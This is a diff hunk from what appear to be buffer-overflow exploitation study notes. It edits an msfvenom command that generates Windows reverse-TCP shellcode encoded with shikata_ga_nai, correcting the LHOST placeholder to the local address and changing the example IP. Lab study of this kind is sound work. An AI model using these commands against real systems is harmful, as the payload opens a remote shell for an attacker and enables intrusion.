@@ -165,9 +165,9 @@ On immunity debugger run mona scripts
 
 create shellcode using mfsvenom 	 
 
-msfvenom -p windows/shell_reverse_tcp LHOST=<Target_ip_address> LPORT=<port> -f py -b '<bad Characters>' -e x86/shikata_ga_nai
+msfvenom -p windows/shell_reverse_tcp LHOST=<TLocal_ip_address> LPORT=<port> -f py -b '<bad Characters>' -e x86/shikata_ga_nai
 (eg.
-    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.220.130 LPORT=443 -f py -b '\x00\x0a\x0d\' -e x86/shikata_ga_nai
+    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.152.141 LPORT=443 -f py -b '\x00\x0a\x0d\' -e x86/shikata_ga_nai
 )
 
 create final overflow pattern 
